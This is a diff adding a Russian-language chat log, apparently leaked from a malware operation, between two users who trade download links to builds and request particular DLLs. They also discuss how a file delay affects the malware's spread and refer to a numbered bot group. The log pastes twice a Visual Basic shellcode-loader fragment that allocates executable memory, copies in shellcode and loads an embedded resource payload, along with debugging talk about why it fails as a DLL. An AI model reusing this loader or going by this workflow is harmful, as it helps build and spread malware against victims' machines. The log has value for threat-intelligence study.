@@ -1,0 +1,105 @@
+Timestamp	From	To	Message
+2020-07-22 13:00:54.707271	many	hof	привет
+2020-08-17 17:46:22.070691	many	hof	привет
+2020-09-11 14:52:15.040556	many	hof	а кто проверит бро
+2020-09-11 14:52:18.703606	many	hof	кагаса нет весь день
+2020-10-07 12:06:42.252245	hof	many	привет
+2020-10-07 12:06:43.456672	hof	many	BidsCYT8J770NUomiKpM0jB8gWcRB
+Download: https://qaz.im/load/eFfeTd/2346Z7
+Delete: https://qaz.im/index.php?a=delete&q=586364407
+2020-10-07 12:06:51.344811	hof	many	тройка несколько вариантов файлов
+2020-10-16 11:46:52.334557	hof	many	на панель залил
+2020-10-16 11:46:58.827663	hof	many	сейчас еще архив скину
+2021-02-19 11:38:45.303267	many	hof	еще тот нужен
+2021-02-24 20:31:12.123521	many	hof	Function TestFunc() As Boolean
+    
+    hInstance = GetModuleHandle(ByVal 0&)
+    
+    tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd)
+    
+    tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40)
+    
+    CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght
+    
+    tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd)
+    
+    InitMyShellCode (tDis)
+
+    Dim hResource       As Long:                Dim hMememory       As Long
+    Dim lResSize        As Long:                Dim pRawData        As Long
+
+    hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA)
+    
+    hMememory = LoadResource(hInstance, hResource)
+    
+    lResSize = SizeofResource(hInstance, hResource)
+    
+    pRawData = LockResource(hMememory)
+    
+    Dim ret As Variant
+    ret = MessageBox(0, "0", "0", 0)
+
+    BexToPointer pRawData
+        
+    
+End Function
+2021-02-24 20:31:27.659449	many	hof	так блиг тоже не работает(( создаю ехе работает
+2021-02-24 20:32:16.785298	many	hof	создаю длл (может неправельно создаю или что то еще надо) не работает доходит до    ret = MessageBox(0, "0", "0", 0) и все.. но ошибки нет типо ресурс не найден
+2021-02-25 06:52:19.949229	many	hof	так блиг тоже не работает(( создаю ехе работает
+2021-02-25 06:52:19.951729	many	hof	Function TestFunc() As Boolean
+    
+    hInstance = GetModuleHandle(ByVal 0&)
+    
+    tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd)
+    
+    tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40)
+    
+    CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght
+    
+    tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd)
+    
+    InitMyShellCode (tDis)
+
+    Dim hResource       As Long:                Dim hMememory       As Long
+    Dim lResSize        As Long:                Dim pRawData        As Long
+
+    hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA)
+    
+    hMememory = LoadResource(hInstance, hResource)
+    
+    lResSize = SizeofResource(hInstance, hResource)
+    
+    pRawData = LockResource(hMememory)
+    
+    Dim ret As Variant
+    ret = MessageBox(0, "0", "0", 0)
+
+    BexToPointer pRawData
+        
+    
+End Function
+2021-02-25 06:52:19.953182	many	hof	создаю длл (может неправельно создаю или что то еще надо) не работает доходит до    ret = MessageBox(0, "0", "0", 0) и все.. но ошибки нет типо ресурс не найден
+2021-03-22 12:19:25.202777	hof	many	привет
+2021-06-24 10:00:13.396963	hof	many	залиты свежие
+2021-07-21 09:08:01.550779	many	hof	привет дай плз зев и сат дллы
+2021-07-21 09:08:19.582145	hof	many	привет, скоро закину
+2021-07-21 09:44:11.820849	hof	many	1e3Q2erBxddcF52cd0r
+Download: https://qaz.im/load/ZYyR5G/AnrEzG
+Delete: https://qaz.im/index.php?a=delete&q=1233836586
+2021-07-21 09:45:54.247760	many	hof	ok sps
+2021-07-21 10:16:24.944798	many	hof	а задержка на файлах если ставить
+2021-07-21 10:16:34.913834	many	hof	влияет на размножение
+2021-07-21 10:16:36.482960	many	hof	?
+2021-07-21 10:20:40.337800	hof	many	а задержка на файлах если ставить
+2021-07-21 10:20:40.340434	hof	many	влияет на размножение
+2021-07-21 10:20:40.344939	hof	many	?
+2021-08-04 11:56:32.575553	many	hof	привет
+2021-09-10 11:29:16.695158	many	hof	zev4.dll и zem1.dll дай плз
+2021-09-10 11:30:47.627772	hof	many	ща
+2021-09-22 12:04:31.571391	many	hof	бро дай роб.133 длл
+2021-09-22 12:04:38.831073	many	hof	плиз
+2021-09-22 12:04:50.803096	many	hof	привкт
+2021-09-22 12:06:13.494129	hof	many	привет
+2021-09-28 15:26:11.916330	hof	many	привет
+2021-10-26 12:18:54.785403	many	hof	привет на 170 группу тройки строка
+2021-12-08 12:17:48.435738	many	hof	привет
